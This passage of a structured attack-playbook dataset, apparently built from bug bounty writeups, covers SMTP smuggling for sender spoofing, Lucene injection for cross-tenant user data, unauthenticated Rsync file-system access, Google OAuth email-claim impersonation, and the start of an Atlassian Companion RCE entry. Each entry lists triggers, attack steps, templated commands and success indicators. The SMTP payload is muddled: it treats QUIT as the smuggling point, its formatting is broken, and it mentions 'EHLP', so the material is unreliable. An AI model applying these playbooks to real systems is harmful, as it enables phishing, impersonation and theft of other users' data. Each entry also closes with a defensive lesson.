Step 6: Immediately after sending the crafted sequence, inject the headers and body of a *second* email, targeting a different recipient or with different content. This second email's content will be delivered as if it originated from the *first* sender, but the *server* might think it's part of the first email's body due to the smuggling.
Step 7: Observe if the second email is delivered to the intended recipient, spoofing the original sender.
payloads_or_patterns:
Example structure for SMTP smuggling attack:

`telnet <TARGET_SMTP_SERVER> 25`
`MAIL FROM: <attacker_sender>@example.com`
`RCPT TO: <victim_email>@example.com`
`DATA`
`From: <attacker_sender>@example.com`
`To: <victim_email>@example.com`
`Subject: Phishing Attempt`

`This is the body of the first email.`
`
`QUIT`  <-- This QUIT command is sent in a way that the *next* part is interpreted as a new email

`MAIL FROM: <attacker_sender>@example.com`
`RCPT TO: <another_victim_email>@example.com`
`DATA`
`From: <attacker_sender>@example.com`
`To: <another_victim_email>@example.com`
`Subject: Second Spoofed Email`

`This is the body of the second, smuggled email.`
`.
`
`QUIT`
tools_recommended: Netcat/Telnet: For manual SMTP interaction and testing.
Custom Python script: To automate the sequence of commands and data injection, especially for fuzzing termination sequences.
Burp Suite (with extensions if available): To proxy and modify SMTP traffic if it's part of a larger web application interaction.
success_indicators: The second email is successfully delivered to `<another_victim_email>@example.com`.
The delivered email appears to be sent from `<attacker_sender>@example.com`.
The email headers and body match the content injected in Step 6.
failure_indicators: SMTP server returns an error code (e.g., 5xx) after sending the crafted termination sequence, indicating it recognized the malformed input.
The second email is not delivered or is delivered with incorrect content/sender.
The server treats the entire input as a single email, including the smuggled parts in the body.
If this happens, try varying the crafted termination sequence or test if the server is vulnerable to other SMTP smuggling techniques (e.g., using EHLP extensions).

playbooks.impact: Attacker can send emails from arbitrary email addresses to any recipient, enabling highly targeted phishing attacks, business email compromise, and impersonation.
playbooks.key_lesson: Always validate and strictly parse SMTP command sequences, especially termination commands like QUIT, RSET, and end-of-data markers, to prevent data injection and email spoofing by treating them as indicators of new email transactions.

meta.title: Apache Lucene Injection on Auth0 Integration

target_profile.technology: Auth0 integration with applications using Apache Lucene for querying user data
affected_components: User query API/endpoint interacting with Auth0

trigger_conditions.when_to_apply: When an application integrates with Auth0 for user management and uses Apache Lucene for querying, and user input is not properly sanitized before being passed to the Lucene query.
prerequisites: Application uses Auth0 for user management
Application uses Apache Lucene for querying user data
Authenticated user context exists
applicability_signals: Error messages disclosing the Lucene query structure
API endpoint that queries users assigned to a tenant
skip_if: No error disclosures revealing Lucene queries
Input sanitization is effectively preventing injection attempts

recon_steps: Step 1: Identify API endpoints responsible for querying users within a tenant.
Step 2: Observe application behavior and error messages when submitting crafted inputs to these endpoints.
attack_steps: Step 1: Send a request to the user query endpoint with a crafted Lucene query designed to break out of the expected query context.
Step 2: Modify the query to include boolean conditions that attempt to broaden the search scope (e.g., query all users).
Step 3: Further refine the query to discover specific fields by checking for their existence (e.g., using `_exists_:field_name`).
Step 4: Employ character-by-character searching to discover the values of discovered fields.
tools_recommended: Burp Suite or similar proxy for intercepting and modifying requests.
Manual crafting of Lucene query syntax.
success_indicators: Responses containing user data from other tenants.
Responses indicating the existence of specific fields within the user index.
Discovery of specific field values through character-by-character enumeration.
failure_indicators: Consistent 400/500 errors without revealing query structure.
Responses only containing data for the current tenant, even with injected queries.
No new fields or data discovered after exhaustive payload attempts.

playbooks.impact: Unauthorized access to sensitive user information belonging to other tenants, potentially including PII and other confidential data stored within Auth0 user profiles.
playbooks.key_lesson: Always validate and sanitize user input used in Lucene queries to prevent injection attacks, especially when dealing with multi-tenant applications where data segregation is critical.

meta.title: One port can be a costly mistake | Attack The Rsync Service in a Private Program

affected_components: Rsync service exposed on a non-standard port

trigger_conditions.when_to_apply: When an Rsync service is discovered running on a non-standard or unexpected port within a target's network, and is accessible from the internet.
prerequisites: Discovery of an open port listening for Rsync traffic.
applicability_signals: Port scan reveals an open port with an Rsync banner.
Masscan or Nmap output showing a service on an unusual port that is identified as Rsync.
skip_if: Rsync service is firewalled and not accessible from the internet.
Rsync service requires authentication that cannot be bypassed.

recon_steps: Step 1: Perform a broad port scan across discovered CIDR ranges using Masscan or Nmap, focusing on common and custom ports (e.g., 8080, 8001, and standard Rsync port 873, as well as the custom port discovered in the writeup).
Step 2: Analyze port scan results for any open ports that exhibit Rsync banners or behavior, particularly on ports other than the default 873.
attack_steps: Step 1: Identify the specific IP address and port where the Rsync service is running.

Step 2: Attempt to connect to the Rsync service on the identified IP and port. The writeup implies that by simply having the port open, Rsync was accessible without authentication. If the service is indeed unauthenticated, commands can be sent.

Step 3: Use `rsync` commands to list files (`rsync -av --progress <TARGET_IP>::` or `rsync -av --progress <TARGET_IP>:<MODULE_NAME>/`), transfer files (e.g., download sensitive files if path traversal is possible or if sensitive directories are exposed). The writeup mentions 'gained access to the entire file system', implying read access to arbitrary files/directories if Rsync was not properly configured.
Step 4: If write access is possible, attempt to upload malicious files or modify existing ones to achieve Remote Code Execution (RCE).
payloads_or_patterns: To list files within a module: `rsync -av --progress <TARGET_IP>::<MODULE_NAME>/`
tools_recommended: Masscan: For fast port scanning across large IP ranges.
Nmap: For detailed service version detection and banner grabbing.
Rsync CLI: For interacting with the Rsync service to list files and transfer data.
success_indicators: Successful listing of directories and files from the target Rsync service without authentication.
Successful transfer of sensitive files from the target Rsync service.
Confirmation of RCE through successful file modification or upload leading to shell access.
failure_indicators: Connection refused or timed out: The port is not open or is firewalled.
Authentication required error: Rsync is configured with authentication (e.g., SSH keys or username/password) that cannot be bypassed.
Permission denied errors: Rsync is configured to restrict access to specific modules or paths.

playbooks.impact: Full read access to the entire file system of the compromised server. This can lead to the disclosure of sensitive information, credentials, configuration files, and potentially facilitate further exploitation or RCE if write access is also available.
playbooks.key_lesson: Always perform comprehensive port scanning across discovered IP ranges, especially for non-standard ports, as unauthenticated services like Rsync can expose the entire file system.

meta.title: Google OAuth is broken (sort of)

affected_components: OAuth login flow for third-party applications (e.g., Slack, Zoom)
tech_stack_fingerprints: Presence of 'Sign in with Google' button
Responses containing Google OAuth redirect URLs

trigger_conditions.when_to_apply: When a target application uses Google OAuth for authentication and relies solely on the email claim without proper verification of organizational membership or domain ownership.
prerequisites: Attacker can create a Google account using a non-Gmail email address that is associated with a corporate domain (e.g., using email plus addressing or aliases).
The target application trusts the email claim from Google OAuth for user identification and authorization.
applicability_signals: Application utilizes Google OAuth for login.
Application's documentation or behavior suggests reliance on email address for identity.
Google OAuth documentation warns against using email as a primary identifier.
skip_if: Target application enforces SAML authentication exclusively.
Target application strictly validates the 'hd' (hosted domain) claim in Google OAuth responses and ensures it matches the organization's domain.
Target application verifies user membership within the Google organization via an API call or other robust mechanism.

recon_steps: Step 1: Identify applications that use 'Sign in with Google'.
Step 2: Review Google OAuth documentation and notice the warning against using email as a primary identifier.
attack_steps: Step 1: Create a Google account using a non-Gmail email address that belongs to a target corporate domain (e.g., [email protected] where 'company.com' is the target's domain). This can be achieved using email plus addressing or by leveraging existing email aliases within the corporate domain.
Step 2: Initiate the OAuth login flow for the target application using the newly created Google account.

Step 3: Observe if the application grants access based on the email claim, effectively allowing an attacker to impersonate a legitimate user or gain access to resources associated with that email address.
Step 4: If the application uses the 'hd' (hosted domain) claim, attempt to verify its presence. If the 'hd' claim is missing or does not match the expected domain, this confirms the vulnerability.
payloads_or_patterns: Use of a Google account created with an email address from a target corporate domain (e.g., <email protected>).
Google OAuth response containing an email claim that does not correspond to a legitimate member of the target organization.
Absence or mismatch of the 'hd' claim in the Google OAuth response.
tools_recommended: Burp Suite: To intercept and analyze Google OAuth requests and responses.
A custom script: To automate the creation of Google accounts with specific email addresses and test them against target applications.
success_indicators: Successful login into the target application using the crafted Google account.
Access to user data or functionality that should be restricted to legitimate corporate employees.
The 'hd' claim is absent or does not match the expected corporate domain in the OAuth response.
failure_indicators: Login attempt fails with an error indicating the user is not authorized or not part of the organization. This suggests the application has implemented proper checks beyond just the email claim. -> Pivot to investigating other OAuth vulnerabilities or token-related exploits.
The 'hd' claim is present and correctly matches the organization's domain. This indicates the application is validating organizational membership. -> No exploit possible via this vector.

playbooks.impact: An attacker can gain indefinite access to third-party applications (like Slack, Zoom) used by a company, even after being off-boarded from the company's Google organization. This allows for potential data exfiltration, unauthorized access, and continued presence within company systems.
playbooks.key_lesson: Do not solely rely on the email claim from OAuth providers for user identification and authorization. Always validate organizational membership or use more robust identity verification mechanisms provided by the OAuth provider, such as the 'hd' claim or specific user ID validation.

meta.title: CVE-2023-22524: RCE Vulnerability in Atlassian Companion for macOS

Step 2: Analyze the identified communication channel for vulnerabilities. The writeup implies a vulnerability in how the application handles certain commands or data received.
Step 3: Craft a malicious payload that exploits the identified vulnerability. This likely involves sending specially crafted data or commands to the application.
